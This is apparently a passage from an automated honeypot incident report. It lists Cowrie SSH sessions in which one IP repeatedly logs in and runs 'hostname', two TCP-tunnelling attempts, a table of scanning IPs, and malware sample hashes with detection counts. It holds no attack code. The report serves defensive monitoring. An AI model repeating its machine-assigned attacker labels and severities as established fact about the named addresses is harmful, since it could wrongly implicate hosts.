| `2026-09-27 16:22:30` | `cowrie.log.closed` |
| `2026-09-27 16:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53bb029b466

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:30` | `cowrie.session.connect` |
| `2026-09-27 16:22:30` | `cowrie.client.version` |
| `2026-09-27 16:22:30` | `cowrie.client.kex` |
| `2026-09-27 16:22:31` | `cowrie.login.success` |
| `2026-09-27 16:22:32` | `cowrie.session.params` |
| `2026-09-27 16:22:32` | `cowrie.command.input` |
| `2026-09-27 16:22:32` | `cowrie.log.closed` |
| `2026-09-27 16:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43b6d9872b54

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:33` | `cowrie.session.connect` |
| `2026-09-27 16:22:33` | `cowrie.client.version` |
| `2026-09-27 16:22:34` | `cowrie.client.kex` |
| `2026-09-27 16:22:35` | `cowrie.login.success` |
| `2026-09-27 16:22:36` | `cowrie.session.params` |
| `2026-09-27 16:22:36` | `cowrie.command.input` |
| `2026-09-27 16:22:37` | `cowrie.log.closed` |
| `2026-09-27 16:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3bcb6accea4

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:37` | `cowrie.session.connect` |
| `2026-09-27 16:22:37` | `cowrie.client.version` |
| `2026-09-27 16:22:38` | `cowrie.client.kex` |
| `2026-09-27 16:22:39` | `cowrie.login.success` |
| `2026-09-27 16:22:40` | `cowrie.session.params` |
| `2026-09-27 16:22:40` | `cowrie.command.input` |
| `2026-09-27 16:22:40` | `cowrie.log.closed` |
| `2026-09-27 16:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729166fb2654

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:44` | `cowrie.session.connect` |
| `2026-09-27 16:22:44` | `cowrie.client.version` |
| `2026-09-27 16:22:46` | `cowrie.client.kex` |
| `2026-09-27 16:22:56` | `cowrie.login.success` |
| `2026-09-27 16:22:58` | `cowrie.session.params` |
| `2026-09-27 16:22:58` | `cowrie.command.input` |
| `2026-09-27 16:22:59` | `cowrie.log.closed` |
| `2026-09-27 16:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2422bb1a726

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:59` | `cowrie.session.connect` |
| `2026-09-27 16:22:59` | `cowrie.client.version` |
| `2026-09-27 16:22:59` | `cowrie.client.kex` |
| `2026-09-27 16:23:00` | `cowrie.login.success` |
| `2026-09-27 16:23:02` | `cowrie.session.params` |
| `2026-09-27 16:23:02` | `cowrie.command.input` |
| `2026-09-27 16:23:03` | `cowrie.log.closed` |
| `2026-09-27 16:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf693b67c3f

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:08` | `cowrie.session.connect` |
| `2026-09-27 16:23:08` | `cowrie.client.version` |
| `2026-09-27 16:23:08` | `cowrie.client.kex` |
| `2026-09-27 16:23:12` | `cowrie.login.success` |
| `2026-09-27 16:23:13` | `cowrie.session.params` |
| `2026-09-27 16:23:13` | `cowrie.command.input` |
| `2026-09-27 16:23:13` | `cowrie.log.closed` |
| `2026-09-27 16:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5fcdd3c2535

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:16` | `cowrie.session.connect` |
| `2026-09-27 16:23:16` | `cowrie.client.version` |
| `2026-09-27 16:23:16` | `cowrie.client.kex` |
| `2026-09-27 16:23:17` | `cowrie.login.success` |
| `2026-09-27 16:23:19` | `cowrie.session.params` |
| `2026-09-27 16:23:19` | `cowrie.command.input` |
| `2026-09-27 16:23:20` | `cowrie.log.closed` |
| `2026-09-27 16:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3319cc8343f3

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:20` | `cowrie.session.connect` |
| `2026-09-27 16:23:20` | `cowrie.client.version` |
| `2026-09-27 16:23:20` | `cowrie.client.kex` |
| `2026-09-27 16:23:21` | `cowrie.login.success` |
| `2026-09-27 16:23:22` | `cowrie.session.params` |
| `2026-09-27 16:23:22` | `cowrie.command.input` |
| `2026-09-27 16:23:22` | `cowrie.log.closed` |
| `2026-09-27 16:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5423de56c50f

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:24` | `cowrie.session.connect` |
| `2026-09-27 16:23:24` | `cowrie.client.version` |
| `2026-09-27 16:23:24` | `cowrie.client.kex` |
| `2026-09-27 16:23:25` | `cowrie.login.success` |
| `2026-09-27 16:23:26` | `cowrie.session.params` |
| `2026-09-27 16:23:26` | `cowrie.command.input` |
| `2026-09-27 16:23:26` | `cowrie.log.closed` |
| `2026-09-27 16:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29fca6a3ebc8

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:27` | `cowrie.session.connect` |
| `2026-09-27 16:23:27` | `cowrie.client.version` |
| `2026-09-27 16:23:27` | `cowrie.client.kex` |
| `2026-09-27 16:23:28` | `cowrie.login.success` |
| `2026-09-27 16:23:29` | `cowrie.session.params` |
| `2026-09-27 16:23:29` | `cowrie.command.input` |
| `2026-09-27 16:23:30` | `cowrie.log.closed` |
| `2026-09-27 16:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84eb7c21d31

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:31` | `cowrie.session.connect` |
| `2026-09-27 16:23:31` | `cowrie.client.version` |
| `2026-09-27 16:23:31` | `cowrie.client.kex` |
| `2026-09-27 16:23:34` | `cowrie.login.success` |
| `2026-09-27 16:23:35` | `cowrie.session.params` |
| `2026-09-27 16:23:35` | `cowrie.command.input` |
| `2026-09-27 16:23:35` | `cowrie.log.closed` |
| `2026-09-27 16:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55cf24cd3684

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:35` | `cowrie.session.connect` |
| `2026-09-27 16:23:35` | `cowrie.client.version` |
| `2026-09-27 16:23:37` | `cowrie.client.kex` |
| `2026-09-27 16:23:39` | `cowrie.login.success` |
| `2026-09-27 16:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b86abc670f3

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:23 |
| **Last Seen** | 2026-09-27 16:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:23:41` | `cowrie.session.connect` |
| `2026-09-27 16:23:41` | `cowrie.client.version` |
| `2026-09-27 16:23:42` | `cowrie.client.kex` |
| `2026-09-27 16:23:46` | `cowrie.login.success` |
| `2026-09-27 16:23:47` | `cowrie.session.params` |
| `2026-09-27 16:23:47` | `cowrie.command.input` |
| `2026-09-27 16:23:47` | `cowrie.log.closed` |
| `2026-09-27 16:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82521748d148

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:24 |
| **Last Seen** | 2026-09-27 16:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:24:02` | `cowrie.session.connect` |
| `2026-09-27 16:24:02` | `cowrie.client.version` |
| `2026-09-27 16:24:02` | `cowrie.client.kex` |
| `2026-09-27 16:24:07` | `cowrie.login.success` |
| `2026-09-27 16:24:08` | `cowrie.session.params` |
| `2026-09-27 16:24:08` | `cowrie.command.input` |
| `2026-09-27 16:24:08` | `cowrie.log.closed` |
| `2026-09-27 16:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deddb2b9bcdd

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-27 16:37 |
| **Last Seen** | 2026-09-27 16:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:37:33` | `cowrie.session.connect` |
| `2026-09-27 16:37:33` | `cowrie.client.version` |
| `2026-09-27 16:37:33` | `cowrie.client.kex` |
| `2026-09-27 16:37:33` | `cowrie.login.success` |
| `2026-09-27 16:37:34` | `cowrie.direct-tcpip.request` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.data` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.request` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.data` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.request` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 16:37:35` | `cowrie.direct-tcpip.data` |
| `2026-09-27 16:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0134e3685cfd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-27 16:43 |
| **Last Seen** | 2026-09-27 16:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:43:18` | `cowrie.session.connect` |
| `2026-09-27 16:43:18` | `cowrie.client.version` |
| `2026-09-27 16:43:18` | `cowrie.client.kex` |
| `2026-09-27 16:43:19` | `cowrie.login.success` |
| `2026-09-27 16:43:19` | `cowrie.direct-tcpip.request` |
| `2026-09-27 16:43:19` | `cowrie.direct-tcpip.data` |
| `2026-09-27 16:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `193.112.192[.]91` | **10** | 2026-09-27 16:22 | 2026-09-27 16:24 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.118[.]121` | **7** | 2026-09-27 15:39 | 2026-09-27 15:59 | 12m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **4** | 2026-09-27 14:32 | 2026-09-27 16:24 | 3m | 0 | `T1592` | 🟢 LOW |
| `193.34.172[.]53` | **4** | 2026-09-27 14:43 | 2026-09-27 14:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `222.113.192[.]184` | **4** | 2026-09-27 14:58 | 2026-09-27 15:44 | 1m | 0 | `T1592` | 🟢 LOW |
| `76.155.131[.]115` | **4** | 2026-09-27 15:52 | 2026-09-27 15:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | **3** | 2026-09-27 13:35 | 2026-09-27 13:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]177` | **3** | 2026-09-27 14:00 | 2026-09-27 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]113` | **3** | 2026-09-27 14:00 | 2026-09-27 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | **3** | 2026-09-27 14:01 | 2026-09-27 14:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.210.210[.]2` | **2** | 2026-09-27 14:53 | 2026-09-27 14:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.40.223[.]141` | **2** | 2026-09-27 16:53 | 2026-09-27 16:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.151.194[.]62` | **2** | 2026-09-27 14:34 | 2026-09-27 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | **2** | 2026-09-27 14:00 | 2026-09-27 14:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.192.59[.]250` | **2** | 2026-09-27 14:56 | 2026-09-27 14:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]209` | 1 | 2026-09-27 15:23 | 2026-09-27 15:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]236` | 1 | 2026-09-27 15:19 | 2026-09-27 15:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.32[.]235` | 1 | 2026-09-27 15:05 | 2026-09-27 15:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.153[.]103` | 1 | 2026-09-27 13:20 | 2026-09-27 13:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `108.59.244[.]5` | 1 | 2026-09-27 14:43 | 2026-09-27 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.55[.]55` | 1 | 2026-09-27 13:21 | 2026-09-27 13:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.144[.]95` | 1 | 2026-09-27 14:31 | 2026-09-27 14:32 | 49s | 0 | `T1592` | 🟢 LOW |
| `121.149.194[.]35` | 1 | 2026-09-27 13:44 | 2026-09-27 13:45 | 32s | 0 | `T1592` | 🟢 LOW |
| `122.155.132[.]40` | 1 | 2026-09-27 13:36 | 2026-09-27 13:37 | 25s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-27 15:36 | 2026-09-27 15:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-09-27 16:06 | 2026-09-27 16:07 | 46s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]88` | 1 | 2026-09-27 15:43 | 2026-09-27 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `142.93.218[.]50` | 1 | 2026-09-27 14:54 | 2026-09-27 14:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | 1 | 2026-09-27 16:21 | 2026-09-27 16:21 | 40s | 0 | `T1592` | 🟢 LOW |
| `165.245.181[.]145` | 1 | 2026-09-27 14:55 | 2026-09-27 14:55 | 8s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-09-27 16:46 | 2026-09-27 16:46 | 5s | 0 | `T1592` | 🟢 LOW |
| `180.94.155[.]108` | 1 | 2026-09-27 15:17 | 2026-09-27 15:17 | 26s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]75` | 1 | 2026-09-27 16:52 | 2026-09-27 16:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-09-27 16:07 | 2026-09-27 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.126.180[.]177` | 1 | 2026-09-27 15:13 | 2026-09-27 15:13 | 12s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-09-27 16:24 | 2026-09-27 16:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.72[.]23` | 1 | 2026-09-27 16:11 | 2026-09-27 16:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.69.35[.]227` | 1 | 2026-09-27 14:18 | 2026-09-27 14:18 | 10s | 0 | `T1592` | 🟢 LOW |
| `211.227.11[.]6` | 1 | 2026-09-27 16:17 | 2026-09-27 16:17 | 29s | 0 | `T1592` | 🟢 LOW |
| `213.131.33[.]2` | 1 | 2026-09-27 16:26 | 2026-09-27 16:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-09-27 15:58 | 2026-09-27 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-09-27 13:35 | 2026-09-27 13:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.248.250[.]122` | 1 | 2026-09-27 14:33 | 2026-09-27 14:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]152` | 1 | 2026-09-27 13:24 | 2026-09-27 13:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]53` | 1 | 2026-09-27 15:03 | 2026-09-27 15:03 | 16s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-27 14:13 | 2026-09-27 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-27 16:13 | 2026-09-27 16:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-09-27 15:49 | 2026-09-27 15:50 | 29s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
